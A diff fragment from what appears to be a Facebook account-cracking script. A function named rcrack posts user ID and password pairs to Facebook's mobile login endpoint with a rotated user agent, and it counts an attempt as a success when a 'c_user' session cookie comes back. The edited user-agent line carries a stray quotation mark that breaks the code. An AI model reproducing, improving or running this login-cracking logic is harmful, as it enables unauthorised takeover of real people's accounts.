@@ -252,8 +252,8 @@ def rcrack(uid,pwx,tl):
 
             'upgrade-insecure-requests': '1',
 
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
-			lo = session.post('https://mbasic.facebook.com/?_rdc=1&_rdr', cookies=cookies, headers=headers).text
+            'user-agent': pro',}
+			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
